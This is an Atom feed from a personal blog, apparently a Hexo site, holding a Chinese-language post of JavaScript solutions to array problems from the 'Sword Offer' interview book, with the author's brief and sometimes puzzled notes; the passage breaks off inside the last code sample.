<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wangsiyuan</title>
  
  <subtitle>小马过河</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="wangsiyuan233.github.io/"/>
  <updated>2018-10-06T12:21:08.507Z</updated>
  <id>wangsiyuan233.github.io/</id>
  
  <author>
    <name>wangsiyuan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>剑指offer(3)--数组篇(JavaScript版)/共 题</title>
    <link href="wangsiyuan233.github.io/2018/10/06/78%E5%89%91%E6%8C%87-%E6%95%B0%E7%BB%84%E7%AF%87/"/>
    <id>wangsiyuan233.github.io/2018/10/06/78剑指-数组篇/</id>
    <published>2018-10-06T11:52:54.000Z</published>
    <updated>2018-10-06T12:21:08.507Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、 二维数组中的查找 p44<br><strong>描述</strong>：在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Find</span><span class="params">(target, array)</span> </span>&#123;</div><div class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;<span class="comment">// column 竖列</span></div><div class="line">  <span class="keyword">let</span> j = <span class="keyword">array</span>[i].length - <span class="number">1</span>; <span class="comment">// row 横行</span></div><div class="line">  <span class="keyword">while</span> (i &lt; <span class="keyword">array</span>.length &amp;&amp; j &gt;= <span class="number">0</span>)&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">array</span>[i][j] &lt; target) &#123;</div><div class="line">      i++;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">array</span>[i][j] &gt; target)&#123;</div><div class="line">      j--;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：？？？</p><blockquote><p>六、旋转数组的最小数字 p82</p></blockquote><p><strong>描述</strong>：把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个非减排序的数组的一个旋转，输出旋转数组的最小元素。 例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。 NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用二分查找</span></div><div class="line">function minNumberInRotateArray(arr)&#123;</div><div class="line">  <span class="keyword">let</span> len = arr.length;</div><div class="line">  <span class="keyword">if</span>(len == <span class="number">0</span>)  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="comment">// 两个指针，最左边和最右边，此时第一个元素应该是大于最后一个元素的（没有重复的元素）。</span></div><div class="line">  <span class="keyword">let</span> <span class="keyword">left</span> = <span class="number">0</span>, <span class="keyword">right</span> = len - <span class="number">1</span>;</div><div class="line">  <span class="keyword">while</span>(<span class="keyword">left</span> &lt; <span class="keyword">right</span>) &#123;</div><div class="line"><span class="comment">//Math.floor() 返回小于或等于一个给定数字的最大整数。</span></div><div class="line">  <span class="keyword">let</span> mid = <span class="keyword">left</span> + <span class="type">Math</span>.floor((<span class="keyword">right</span>-<span class="keyword">left</span>)/<span class="number">2</span>);</div><div class="line"><span class="comment">//中间元素大于最后一个元素，则中间元素位于前面的递增子数组，此时最小元素位于中间元素的后面。我们可以让第一个指针left指向中间元素的后一个元素。</span></div><div class="line">  <span class="keyword">if</span>(arr[mid] &gt; arr[<span class="keyword">right</span>])&#123;</div><div class="line">    <span class="keyword">left</span> = mid + <span class="number">1</span>;</div><div class="line"><span class="comment">// 中间元素位于后面的递增子数组，此时最小元素位于中间元素的前面</span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[mid] == arr[<span class="keyword">right</span>])&#123;</div><div class="line">      <span class="keyword">right</span> = <span class="keyword">right</span> - <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">right</span> = mid;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> arr[<span class="keyword">left</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、这题直接用<code>math.min.apply(null,arr)</code>特没劲儿，时间也是最长的，要用二分查找法<br>2、总结 <code>math.min</code> 是取最小值，但是它是一个一个数字的取，并不能支持数组<br>3、所以 <code>apply</code> 的第一个参数是什么根本不重要，重要的是为了把第二个参数（设置为数组）传进去，找到了最小数，就把他们搬到数组的头部</p><blockquote><p>十三、调整数组顺序使奇数位于偶数前面 p129</p></blockquote><p><strong>描述</strong>：输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function reOrderArray(<span class="built_in">array</span>)&#123;</div><div class="line">    <span class="built_in">var</span> arr1=[],arr2=[];</div><div class="line">    <span class="keyword">for</span>(<span class="built_in">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">array</span>.<span class="built_in">length</span>;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[i]<span class="symbol">%</span><span class="number">2</span>!=<span class="number">0</span>)&#123;</div><div class="line">          arr1.<span class="built_in">push</span>(<span class="built_in">array</span>[i]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">          arr2.<span class="built_in">push</span>(<span class="built_in">array</span>[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> arr1.<span class="built_in">concat</span>(arr2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/设置两个空数组，<code>push() + concat()</code></p><blockquote><p>二十八、数组中出现次数超过一半的数字 p205<br><strong>描述</strong>：数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MoreThanHalfNum_Solution</span>(<span class="params">numbers</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> arr = [],</div><div class="line">        len = numbers.length,</div><div class="line">        a;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</div><div class="line">        a = numbers[i];</div><div class="line">        <span class="keyword">if</span>(arr[a])&#123;</div><div class="line">          <span class="comment">// 如果下一个数字和之前保存的数字相同，就 + 1</span></div><div class="line">            arr[a]++;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">          <span class="comment">// 如果下一个数字和之前保存的数字相同，就 为 1</span></div><div class="line">            arr[a] = <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</div><div class="line">      <span class="comment">// 如果这个数超过了一半 ，就返回这个数</span></div><div class="line">        <span class="keyword">if</span>(arr[i] &gt; len/<span class="number">2</span>)&#123;</div><div class="line">            <span class="keyword">return</span> i;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：???</p><blockquote><p>三十、连续子数组的最大和 p281<br><strong>描述</strong>：输入一个整型数组，数组里有整数也有负数。数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。要求时间复杂度为 O(n)。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function FindGreatestSumOfSubArray(<span class="built_in">array</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">array</span>.<span class="built_in">length</span> &lt; <span class="number">0</span>) <span class="built_in">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="built_in">var</span> len = <span class="built_in">array</span>.<span class="built_in">length</span>,</div><div class="line">        <span class="built_in">sum</span> = <span class="built_in">array</span>[<span class="number">0</span>],//记录当前所有子数组的和的最大值</div><div class="line">        temp = <span class="built_in">array</span>[<span class="number">0</span>]; //包含<span class="built_in">array</span>[i]的连续数组最大值</div><div class="line">    <span class="keyword">for</span>(<span class="built_in">var</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</div><div class="line">      // 当连续数组小于 <span class="number">0</span> 时，之前的累加被抛弃，从现在开始算起</div><div class="line">      // 当连续数组大于 <span class="number">0</span> 时，继续累加</div><div class="line">      // 牛逼牛逼！</div><div class="line">        temp = (temp &lt; <span class="number">0</span>) ? <span class="built_in">array</span>[i] : temp + <span class="built_in">array</span>[i];</div><div class="line">      // 如果 连续数组 的值大一些，就取连续数组的值 作为 最后的值</div><div class="line">        <span class="built_in">sum</span> = (temp &gt; <span class="built_in">sum</span>) ? temp : <span class="built_in">sum</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> <span class="built_in">sum</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：???</p><blockquote><p>三十二、把数组排成最小的数 p227<br><strong>描述</strong>：输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrintMinNumber</span>(<span class="params">numbers</span>)</span>&#123;</div><div class="line">    numbers.sort(<span class="function"><span class="keyword">function</span>(<span class="params">num1,num2</span>)</span>&#123;</div><div class="line">     num1 = num1.toString();</div><div class="line">     num2 = num2.toString();</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">parseInt</span>(num1+num2)&gt;<span class="built_in">parseInt</span>(num2+num1))&#123;</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">return</span> <span class="number">-1</span></div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">    <span class="comment">// 通过空格分割字符串</span></div><div class="line">    <span class="keyword">return</span> numbers.join(<span class="string">''</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：????</p><blockquote><p>三十五、数组中的逆序对 P249<br><strong>描述</strong>：在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> InversePairs(<span class="keyword">data</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="comment">!data||data.length&lt;2) return 0;</span></div><div class="line"></div><div class="line">    var copy = <span class="keyword">data</span>.slice(),</div><div class="line">        <span class="built_in">count</span> = <span class="number">0</span>;</div><div class="line">    <span class="built_in">count</span> = mergeSort(<span class="keyword">data</span>,copy,<span class="number">0</span>,<span class="keyword">data</span>.length-<span class="number">1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="built_in">count</span>%<span class="number">1000000007</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span></span> mergeSort(<span class="keyword">data</span>,copy,start,<span class="keyword">end</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">end</span>===start) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    // <span class="number">14</span>（即二进制的 <span class="number">00001110</span>）左移两位等于 <span class="number">56</span>（即二进制的 <span class="number">00111000</span>）</div><div class="line">    // 所以我为什么需要右移一位呢？</div><div class="line">    var mid = (<span class="keyword">end</span>-start)&gt;&gt;<span class="number">1</span>,</div><div class="line">        left = mergeSort(copy,<span class="keyword">data</span>,start,start+mid),</div><div class="line">        right = mergeSort(copy,<span class="keyword">data</span>,start+mid+<span class="number">1</span>,<span class="keyword">end</span>),</div><div class="line">        <span class="built_in">count</span> = <span class="number">0</span>,</div><div class="line">        p = start+mid,//前一个数组的最后一个下标</div><div class="line">        q = <span class="keyword">end</span>,//后一个数组的最后一个下标</div><div class="line">        copyIndex = <span class="keyword">end</span>;//辅助数组下标，从最后一个算起</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(p&gt;=start&amp;&amp;q&gt;=start+mid+<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">data</span>[p]&gt;<span class="keyword">data</span>[q])&#123;</div><div class="line">            <span class="built_in">count</span>+=q-start-mid;</div><div class="line">            copy[copyIndex--] = <span class="keyword">data</span>[p--];</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            copy[copyIndex--] = <span class="keyword">data</span>[q--];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(p&gt;=start)&#123;</div><div class="line">        copy[copyIndex--] = <span class="keyword">data</span>[p--];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(q&gt;=start+mid+<span class="number">1</span>)&#123;</div><div class="line">        copy[copyIndex--] = <span class="keyword">data</span>[q--];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> left+right+<span class="built_in">count</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：这题我实在做不到，已经看着发呆了好几个小时了，完全不行，放弃</p><blockquote><p>三十七、数字在排序数组中出现的次数 p263<br><strong>描述</strong>：统计一个数字在排序数组中出现的次数。<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> GetNumberOfK(<span class="keyword">data</span>,k) &#123;</div><div class="line">   var <span class="built_in">count</span> =<span class="number">0</span>;</div><div class="line">    for(var i =<span class="number">0</span> ;i&lt;<span class="keyword">data</span>.length;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">data</span>[i]==k)&#123;</div><div class="line">            <span class="built_in">count</span>++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">count</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：看见有序就想到了二分查找法</p><blockquote><p>四十、数组中只出现一次的数字 p275<br><strong>描述</strong>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 方法一</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindNumsAppearOnce</span><span class="params">(array)</span></span>&#123;</div><div class="line">    <span class="comment">// return list, 比如[a,b]，其中ab是出现一次的两个数字</span></div><div class="line">    <span class="keyword">var</span> arr = [];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">array</span>.indexOf(<span class="keyword">array</span>[i]) === <span class="keyword">array</span>.lastIndexOf(<span class="keyword">array</span>[i])) &#123;</div><div class="line">            arr.push(<span class="keyword">array</span>[i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 方法二</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindNumsAppearOnce</span><span class="params">(array)</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> obj=&#123;&#125;; <span class="comment">// 为啥？</span></div><div class="line">    <span class="keyword">var</span> arr=[]; <span class="comment">// 为啥？</span></div><div class="line">    <span class="keyword">var</span> length=<span class="keyword">array</span>.length;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">array</span>[i] in obj)&#123;</div><div class="line">            obj[<span class="keyword">array</span>[i]]++;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            obj[<span class="keyword">array</span>[i]]=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(attr in obj)&#123;</div><div class="line">        <span class="keyword">if</span>(obj[attr] == <span class="number">1</span>)&#123;</div><div class="line">            arr.push(attr);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> arr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 方法三、位运算</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindNumsAppearOnce</span><span class="params">(array)</span></span>&#123;</div><div class="line">    <span class="comment">// return list, 比如[a,b]，其中ab是出现一次的两个数字</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">findFirst1</span><span class="params">(num)</span> </span>&#123;</div><div class="line">        <span class="keyword">var</span> index = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (((num &amp; <span class="number">1</span>) === <span class="number">0</span>) &amp;&amp; (index &lt; <span class="number">64</span>)) &#123;</div><div class="line">            num = num &gt;&gt; <span class="number">1</span>;</div><div class="line">            index++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> index;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is1</span><span class="params">(num, index)</span> </span>&#123;</div><div class="line">        num = num &gt;&gt; index;</div><div class="line">        <span class="keyword">return</span> num &amp; <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">Array</span>.isArray(<span class="keyword">array</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">array</span>.length &lt; <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">return</span> [];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> exclusive = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">            exclusive ^= <span class="keyword">array</span>[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> indexOf1 = findFirst1(exclusive);</div><div class="line">        <span class="keyword">var</span> num1 = <span class="number">0</span>,</div><div class="line">            num2 = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (is1(<span class="keyword">array</span>[i], indexOf1)) &#123;</div><div class="line">                num1 ^= <span class="keyword">array</span>[i];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                num2 ^= <span class="keyword">array</span>[i];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> [num1, num2];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：放了三个我完全看不懂的方法，留给第三轮的自己。。呵呵</p><blockquote><p>四十五、扑克牌顺子 p298<br><strong>描述</strong>：从扑克牌中随机抽 5 张牌，判断是不是一个顺子，即这 5 张牌是不是连续的，2-10为数字本身，大小王可以看成任何数字,并且A看作1,J为11,Q为12,K为13。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsContinuous</span>(<span class="params">numbers</span>)</span>&#123;</div><div class="line">    <span class="comment">//思路：首先先排序，然后统计大小王个数，然后遍历，看缺多少个数才能连续，如果超过大小王个数则失败。</span></div><div class="line">    <span class="keyword">var</span> num_zero = <span class="number">0</span>;  <span class="comment">//王的数量</span></div><div class="line">    <span class="keyword">var</span> lack_number = <span class="number">0</span>;</div><div class="line">    <span class="keyword">var</span> sort_number = numbers.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</div><div class="line">            <span class="keyword">return</span> a-b;</div><div class="line">    &#125;);</div><div class="line">    <span class="keyword">if</span>(!numbers || numbers.length &lt; <span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; numbers.length<span class="number">-1</span>; i++) &#123;</div><div class="line">            <span class="comment">// 计算癞子数量</span></div><div class="line">            <span class="keyword">if</span> (numbers[i] == <span class="number">0</span>) &#123;</div><div class="line">                num_zero++;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">// 对子，直接返回</span></div><div class="line">            <span class="keyword">if</span> (numbers[i] == numbers[i + <span class="number">1</span>]) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">            &#125;</div><div class="line">            lack_number += numbers[i + <span class="number">1</span>] - numbers[i] - <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    <span class="keyword">return</span> lack_number&lt;=num_zero;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：？？？？</p><blockquote><p>五十、数组中重复的数字 p39</p></blockquote><p><strong>描述</strong>：在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">duplicate</span>(<span class="params">numbers, duplication</span>)</span>&#123;</div><div class="line">  <span class="comment">//这里要特别注意~找到任意重复的一个值并赋值到duplication[0]</span></div><div class="line">  <span class="comment">//函数返回True/False</span></div><div class="line">  <span class="keyword">var</span> length = numbers.length;</div><div class="line">  <span class="keyword">var</span> obj=&#123;&#125;; <span class="comment">// 哈希表</span></div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</div><div class="line">    <span class="keyword">if</span>(numbers[i] <span class="keyword">in</span> obj)&#123;</div><div class="line">        duplication[<span class="number">0</span>]=numbers[i];</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        obj[numbers[i]]=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：????</p><blockquote><p>五十一、构建乘积数组 p312</p></blockquote><p><strong>描述</strong>：给定一个数组A[0,1,…,n-1],请构建一个数组B[0,1,…,n-1],其中B中的元素B[i]=A[0]<em>A[1]</em>…<em>A[i-1]</em>A[i+1]<em>…</em>A[n-1]。不能使用除法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span><span class="params">(array)</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">array</span>||<span class="keyword">array</span>.length&lt;=<span class="number">0</span>) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">var</span> len=<span class="keyword">array</span>.length;</div><div class="line">    <span class="keyword">var</span> b=[],c=[],d=[];</div><div class="line">    b[<span class="number">0</span>]=<span class="number">1</span>;</div><div class="line">    <span class="comment">//计算下三角连乘</span></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;len;i++)&#123;</div><div class="line">        b[i]=b[i<span class="number">-1</span>]*<span class="keyword">array</span>[i<span class="number">-1</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> temp=<span class="number">1</span>;</div><div class="line">    <span class="comment">//计算上三角</span></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=len<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</div><div class="line">        temp*=<span 